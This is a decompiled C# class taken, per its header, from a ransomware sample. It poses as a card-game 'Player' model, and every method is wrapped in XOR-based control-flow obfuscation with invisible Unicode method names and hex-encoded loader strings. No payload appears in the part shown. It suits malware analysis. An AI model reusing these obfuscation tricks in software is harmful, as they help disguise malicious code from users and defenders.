// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: SingleArrayTypeIn, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 96646636-5181-465D-A45F-CFFED007E535
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-c30e1e448c40d6cf6fae39ea6bb5874bdbb3607fa9f601a121dad5ca9645808e.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = 1941892844;
      string str1;
      string str2;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1029175159)) % 12U)
        {
          case 0:
            str1 = "4D70643043716B4E76";
            num1 = (int) num2 * 557642141 ^ -129930566;
            continue;
          case 1:
            num1 = (int) num2 * -1644481276 ^ 1964824404;
            continue;
          case 2:
            str1 = "4D6574686F644275696C64";
            num1 = (int) num2 * -677096135 ^ 117738191;
            continue;
          case 3:
            int num3 = flag ? -759322314 : (num3 = -1653766807);
            num1 = num3 ^ (int) num2 * -500305523;
            continue;
          case 4:
            goto label_1;
          case 5:
            num1 = (int) num2 * 279533702 ^ 29639238;
            continue;
          case 7:
            str2 = str1;
            num1 = 1213339949;
            continue;
          case 8:
            flag = BaseStream == 0;
            num1 = (int) num2 * 717412472 ^ -617322012;
            continue;
          case 9:
            int num4;
            num1 = num4 = BaseStream == 1 ? 1924646011 : (num4 = 2096428048);
            continue;
          case 10:
            num1 = (int) num2 * -128427959 ^ -37458912;
            continue;
          case 11:
            str1 = (string) null;
            num1 = (int) num2 * 1108666389 ^ -2140094528;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = 1514553044;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 748451389)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -1636873110 ^ -1319640289;
            continue;
          case 1:
            goto label_3;
          case 3:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      int num3 = 0;
      goto label_5;
label_7:
      int num4;
      return num4;
label_4:
      num3 = this.PlanningCards[cardTypeIndex];
label_5:
      num4 = num3;
      num1 = 2121989917;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = -1482657682;
        int num2;
        int index;
        int planningCardsCount;
        int[] planningCards;
        int num3;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ -828796946)) % 13U)
          {
            case 0:
              num1 = (int) num4 * -446438328 ^ -315881533;
              continue;
            case 1:
              ++num2;
              num1 = (int) num4 * -350123275 ^ -509620096;
              continue;
            case 2:
              goto label_1;
            case 3:
              planningCardsCount = num2;
              num1 = (int) num4 * -2032711926 ^ 179677263;
              continue;
            case 4:
              int num5;
              num1 = num5 = index >= planningCards.Length ? -1217186610 : (num5 = -369674362);
              continue;
            case 5:
              ++index;
              num1 = (int) num4 * 884283120 ^ -359117803;
              continue;
            case 6:
              num1 = -942748955;
              continue;
            case 8:
              num2 = 0;
              num1 = (int) num4 * -99065599 ^ -341560189;
              continue;
            case 9:
              planningCards = this.PlanningCards;
              index = 0;
              num1 = (int) num4 * 1723948929 ^ -1572418008;
              continue;
            case 10:
              num3 = planningCards[index];
              num1 = -1862990176;
              continue;
            case 11:
              num1 = (int) num4 * -1079528236 ^ 1647221238;
              continue;
            case 12:
              int num6 = num3 <= 0 ? 473430516 : (num6 = 758546278);
              num1 = num6 ^ (int) num4 * 1377180425;
              continue;
            default:
              goto label_14;
          }
        }
label_14:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = -708586874;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -401835900)) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * -1624149842 ^ 1985392098;
            continue;
          case 2:
            num1 = (int) num2 * 35414569 ^ -153739909;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -419002609;
      string str1;
      int index;
      int planningCard;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -439115325)) % 11U)
        {
          case 0:
            num1 = -966681607;
            continue;
          case 1:
            str1 = " ";
            index = 0;
            num1 = (int) num2 * -1652901120 ^ -1795900498;
            continue;
          case 3:
            num1 = (int) num2 * -1454218636 ^ 960977128;
            continue;
          case 4:
            ++index;
            num1 = -956638324;
            continue;
          case 5:
            str1 = Player.\u200E⁯‏‪‫‫‎‬‏⁮‫⁬‍‬‍⁪⁫‮​‬⁪‏⁫⁪⁪‍​‎⁯⁮⁭‪‭‎‌‫⁯‪​⁮‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -261934952;
            continue;
          case 6:
            goto label_1;
          case 7:
            planningCard = this.PlanningCards[index];
            int num3 = planningCard == 0 ? 1825837173 : (num3 = 220702730);
            num1 = num3 ^ (int) num2 * -301898487;
            continue;
          case 8:
            num1 = (int) num2 * 426183883 ^ -1771795828;
            continue;
          case 9:
            str2 = str1;
            num1 = (int) num2 * 1624213389 ^ -754998989;
            continue;
          case 10:
            int num4;
            num1 = num4 = index < this.PlanningCards.Length ? -180990658 : (num4 = -397419256);
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = -399598422;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1937869213)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * 298288903 ^ -959291794;
            continue;
          case 2:
            num1 = (int) num2 * -1490385277 ^ 942152710;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = -1017562727;
      int aIndex;
      int count;
      bool flag;
      int[] numArray;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1627445529)) % 9U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -643476412 ^ 884535498;
            continue;
          case 2:
            count = json.Count;
            numArray = new int[count];
            aIndex = 0;
            num1 = (int) num2 * 625902721 ^ 260499500;
            continue;
          case 3:
            num1 = (int) num2 * 388682302 ^ -1760396789;
            continue;
          case 4:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = -2058612771;
            continue;
          case 6:
            planningCards = numArray;
            num1 = (int) num2 * 865550120 ^ -627299566;
            continue;
          case 7:
            int num3 = !flag ? 585589991 : (num3 = 1967884674);
            num1 = num3 ^ (int) num2 * 1529703855;
            continue;
          case 8:
            flag = aIndex < count;
            num1 = -2041170388;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = -1405634771;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -584092189)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1930750636 ^ -912842352;
            continue;
          case 2:
            str = Player.\u206A⁭⁫⁫⁫⁬⁮‭⁪⁪⁯​‌‭⁬‏⁬‏⁫‪⁯‬⁬​‌‏‏⁭⁫⁮‫⁪‎‭⁭‭‎⁮‬⁬‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * -1402034717 ^ -2031871928;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u200E⁯‏‪‫‫‎‬‏⁮‫⁬‍‬‍⁪⁫‮​‬⁪‏⁫⁪⁪‍​‎⁯⁮⁭‪‭‎‌‫⁯‪​⁮‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206A⁭⁫⁫⁫⁬⁮‭⁪⁪⁯​‌‭⁬‏⁬‏⁫‪⁯‬⁬​‌‏‏⁭⁫⁮‫⁪‎‭⁭‭‎⁮‬⁬‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
